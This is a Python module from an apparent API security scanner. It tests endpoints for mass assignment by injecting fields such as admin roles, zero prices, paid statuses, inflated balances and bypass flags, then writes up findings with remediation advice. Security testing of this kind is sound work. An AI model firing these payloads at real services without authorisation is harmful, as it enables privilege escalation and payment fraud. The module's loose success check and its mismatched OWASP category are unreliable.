"""
Mass Assignment Vulnerability Detection Module.

Tests API endpoints for mass assignment vulnerabilities by:
- Adding extra properties to request bodies
- Manipulating object properties (price, role, isAdmin)
- Testing for property injection
- Detecting schema bypass issues
"""

import time
import json
import re
from typing import Any, Optional
import requests

from ..models import (
    AttackType,
    AttackResult,
    Endpoint,
    Parameter,
    Severity,
    Vulnerability
)


class MassAssignmentAttacker:
    """Detects mass assignment vulnerabilities in API endpoints.
    
    Mass Assignment occurs when an API accepts and processes
    properties that should not be modifiable by the user.
    """
    
    # Common sensitive properties to test for mass assignment
    SENSITIVE_PROPERTIES = {
        # Role/Permission manipulation
        'role': ['admin', 'administrator', 'superuser', 'manager', 'root'],
        'isAdmin': [True, False],
        'is_admin': [True, False],
        'is_superuser': [True, False],
        'role_id': [1, 0, 'admin'],
        'permissions': ['*.*', 'admin.*', 'all'],
        'user_type': ['admin', 'premium', 'vip'],
        'access_level': ['admin', 'root', 'super'],
        'privileges': ['all', 'admin'],
        
        # Price/Financial manipulation
        'price': [0, 0.0, -1, -100, '0.00', None],
        'amount': [0, 0.0, -1, None],
        'total': [0, 0.0, -1],
        'cost': [0, 0.0],
        'balance': [1000000, 99999, 0],
        'credit': [1000000, 99999],
        'discount': [100, 99, 50],
        'refund_amount': [999999, -1],
        
        # Status manipulation
        'status': ['approved', 'completed', 'paid', 'active', 'verified'],
        'is_paid': [True],
        'is_active': [True, False],
        'is_verified': [True],
        'is_approved': [True],
        'is_completed': [True],
        'is_deleted': [False],
        'paid': [True],
        'verified': [True],
        
        # User identity manipulation
        'user_id': ['victim_user_id', 'admin', '1'],
        'userId': ['victim_user_id', 'admin'],
        'owner_id': ['victim_user_id', 'other_user'],
        'created_by': ['admin', 'other_user'],
        'email_verified': [True],
        'account_status': ['active', 'premium'],
        
        # Internal properties
        '_id': ['injected_id'],
        'id': [999999, 'injected'],
        'created_at': ['2020-01-01'],
        'updated_at': ['2025-01-01'],
        'version': [1, 0],
        '__v': [0],
        
        # Bypass properties
        'bypass_payment': [True],
        'skip_validation': [True],
        'test_mode': [True],
        'debug': [True],
        'internal': [True],
        'override': [True],
    }
    
    # Context-specific injection payloads
    ORDER_PAYLOADS = [
        {'price': 0, 'total': 0, 'amount': 0},
        {'status': 'paid', 'is_paid': True},
        {'refund_amount': 9999},
        {'payment_status': 'completed'},
        {'bypass_payment': True},
    ]
    
    USER_PAYLOADS = [
        {'role': 'admin', 'isAdmin': True},
        {'is_verified': True, 'email_verified': True},
        {'account_type': 'premium', 'subscription': 'enterprise'},
        {'balance': 1000000, 'credit': 99999},
    ]
    
    PRODUCT_PAYLOADS = [
        {'price': 0, 'cost': 0},
        {'discount': 100, 'discount_percent': 100},
        {'free': True},
    ]
    
    def __init__(self, target_url: str, timeout: int = 10):
        """Initialize the Mass Assignment detector.
        
        Args:
            target_url: Base URL of the target API
            timeout: Request timeout in seconds
        """
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Sentinel/1.0 Mass Assignment Scanner',
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        })
    
    def attack(
        self,
        endpoint: Endpoint,
        auth_token: Optional[str] = None,
        parameters_to_test: Optional[list[str]] = None
    ) -> list[AttackResult]:
        """Perform mass assignment attacks on an endpoint.
        
        Args:
            endpoint: The endpoint to attack
            auth_token: Authentication token for the request
            parameters_to_test: Not used for this attack type
            
        Returns:
            List of attack results
        """
        results: list[AttackResult] = []
        
        # Handle API misuse
        if auth_token is not None and isinstance(auth_token, list):
            parameters_to_test = auth_token
            auth_token = None
        
        if auth_token:
            self.session.headers['Authorization'] = f"Bearer {auth_token}"
        
        # Only test endpoints that accept body data
        if endpoint.method.value not in ['POST', 'PUT', 'PATCH']:
            return results
        
        # Get base request body from endpoint parameters
        base_body = self._build_base_body(endpoint)
        
        # Determine context based on endpoint path
        context_payloads = self._get_context_payloads(endpoint.path)
        
        # Test 1: Single property injection
        for prop, values in self.SENSITIVE_PROPERTIES.items():
            for value in values[:2]:  # Limit tests per property
                result = self._test_single_property(endpoint, base_body, prop, value)
                if result:
                    results.append(result)
        
        # Test 2: Context-specific payloads
        for payload in context_payloads:
            result = self._test_payload(endpoint, base_body, payload, "Context-based")
            if result:
                results.append(result)
        
        # Test 3: Combined property injection
        combined_payloads = self._generate_combined_payloads()
        for payload in combined_payloads:
            result = self._test_payload(endpoint, base_body, payload, "Combined")
            if result:
                results.append(result)
        
        # Test 4: Nested object injection
        nested_payloads = self._generate_nested_payloads()
        for payload in nested_payloads:
            result = self._test_payload(endpoint, base_body, payload, "Nested")
            if result:
                results.append(result)
        
        return results
    
    def _build_base_body(self, endpoint: Endpoint) -> dict:
        """Build base request body from endpoint parameters."""
        body = {}
        
        for param in endpoint.parameters:
            if param.location == 'body':
                if param.example:
                    body[param.name] = param.example
                else:
                    body[param.name] = self._get_default_value(param)
        
        return body
    
    def _get_default_value(self, param: Parameter) -> Any:
        """Get default value for a parameter type."""
        defaults = {
            'string': 'test',
            'integer': 1,
            'number': 1.0,
            'boolean': True,
            'array': [],
            'object': {}
        }
        return defaults.get(param.param_type, 'test')
    
    def _get_context_payloads(self, path: str) -> list[dict]:
        """Get payloads based on endpoint context."""
        payloads = []
        path_lower = path.lower()
        
        if any(word in path_lower for word in ['order', 'cart', 'checkout', 'shop']):
            payloads.extend(self.ORDER_PAYLOADS)
        
        if any(word in path_lower for word in ['user', 'account', 'profile', 'signup']):
            payloads.extend(self.USER_PAYLOADS)
        
        if any(word in path_lower for word in ['product', 'item', 'coupon', 'video']):
            payloads.extend(self.PRODUCT_PAYLOADS)
        
        return payloads
    
    def _test_single_property(
        self,
        endpoint: Endpoint,
        base_body: dict,
        prop: str,
        value: Any
    ) -> Optional[AttackResult]:
        """Test injection of a single property."""
        # Skip if property already exists in base body
        if prop in base_body:
            return None
        
        payload_body = {**base_body, prop: value}
        
        try:
            url = f"{self.target_url}{endpoint.path}"
            start_time = time.time()
            
            response = self.session.request(
                endpoint.method.value,
                url,
                json=payload_body,
                timeout=self.timeout
            )
            
            duration_ms = (time.time() - start_time) * 1000
            
            # Check if property was accepted
            is_vulnerable = self._is_vulnerable(response, prop, value)
            
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.MASS_ASSIGNMENT,
                success=is_vulnerable,
                payload=json.dumps({prop: value}),
                response_status=response.status_code,
                response_body=response.text[:500],
                duration_ms=duration_ms
            )
            
        except Exception as e:
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.MASS_ASSIGNMENT,
                success=False,
                payload=json.dumps({prop: value}),
                error_message=str(e)
            )
    
    def _test_payload(
        self,
        endpoint: Endpoint,
        base_body: dict,
        extra_payload: dict,
        payload_type: str
    ) -> Optional[AttackResult]:
        """Test with a combined payload."""
        # Merge payloads
        payload_body = {**base_body, **extra_payload}
        
        try:
            url = f"{self.target_url}{endpoint.path}"
            start_time = time.time()
            
            response = self.session.request(
                endpoint.method.value,
                url,
                json=payload_body,
                timeout=self.timeout
            )
            
            duration_ms = (time.time() - start_time) * 1000
            
            # Check for successful injection
            is_vulnerable = self._is_vulnerable(response, list(extra_payload.keys()), extra_payload)
            
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.MASS_ASSIGNMENT,
                success=is_vulnerable,
                payload=f"{payload_type}: {json.dumps(extra_payload)}",
                response_status=response.status_code,
                response_body=response.text[:500],
                duration_ms=duration_ms
            )
            
        except Exception as e:
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.MASS_ASSIGNMENT,
                success=False,
                payload=f"{payload_type}: {json.dumps(extra_payload)}",
                error_message=str(e)
            )
    
    def _generate_combined_payloads(self) -> list[dict]:
        """Generate payloads combining multiple sensitive properties."""
        return [
            {'role': 'admin', 'isAdmin': True},
            {'price': 0, 'status': 'paid'},
            {'balance': 99999, 'account_type': 'premium'},
            {'status': 'completed', 'is_paid': True, 'paid': True},
            {'discount': 100, 'price': 0, 'total': 0},
        ]
    
    def _generate_nested_payloads(self) -> list[dict]:
        """Generate payloads with nested object injection."""
        return [
            {'user': {'role': 'admin', 'isAdmin': True}},
            {'order': {'status': 'paid', 'total': 0}},
            {'payment': {'status': 'completed', 'amount': 0}},
            {'metadata': {'internal': True, 'bypass_validation': True}},
            {'settings': {'role': 'admin', 'permissions': ['*.*']}},
        ]
    
    def _is_vulnerable(
        self,
        response: requests.Response,
        injected_props: Any,
        injected_values: Any
    ) -> bool:
        """Check if the mass assignment was successful."""
        # Success codes suggest the request was processed
        if response.status_code not in [200, 201, 202, 204]:
            return False
        
        # For 204 No Content, assume success if no error
        if response.status_code == 204:
            return True
        
        try:
            data = response.json()
            data_str = json.dumps(data).lower()
            
            # Check if injected property is in response
            if isinstance(injected_props, list):
                for prop in injected_props:
                    if prop.lower() in data_str:
                        return True
            elif isinstance(injected_props, str):
                if injected_props.lower() in data_str:
                    return True
            
            # Check for success indicators
            if 'success' in data and data['success']:
                return True
            
            # Check for created/updated resource
            if 'id' in data or '_id' in data:
                return True
            
            # Check if response doesn't indicate error
            if 'error' not in data_str and 'failed' not in data_str:
                return True
                
        except:
            # Non-JSON response with success status
            if response.status_code in [200, 201, 202]:
                return True
        
        return False
    
    def create_vulnerability(
        self,
        result: AttackResult,
        endpoint: Endpoint
    ) -> Vulnerability:
        """Create a Vulnerability object from an attack result."""
        return Vulnerability(
            endpoint=endpoint,
            attack_type=AttackType.MASS_ASSIGNMENT,
            severity=Severity.HIGH,
            title=f"Mass Assignment in {endpoint.full_path}",
            description=(
                f"Mass Assignment vulnerability detected. The API endpoint accepts "
                f"and processes user-supplied properties that should be restricted, "
                f"potentially allowing attackers to modify sensitive object properties "
                f"like roles, prices, or status values. {result.error_message or ''}"
            ),
            payload=result.payload or "",
            proof_of_concept=(
                f"Request: {endpoint.method.value} {endpoint.path}\n"
                f"Injected Payload: {result.payload}\n"
                f"Response Status: {result.response_status}\n"
                f"The endpoint accepted the injected properties without validation."
            ),
            recommendation=(
                "1. Implement allowlist of properties that users can modify\n"
                "2. Use DTOs (Data Transfer Objects) for input validation\n"
                "3. Never bind user input directly to domain objects\n"
                "4. Implement property-level authorization checks\n"
                "5. Use frameworks with built-in mass assignment protection\n"
                "6. Explicitly define writable vs read-only properties\n"
                "7. Validate that modified properties match expected schema"
            ),
            cwe_id="CWE-915",
            owasp_category="API6:2023 - Unrestricted Access to Sensitive Business Flows",
            response_evidence=result.response_body
        )
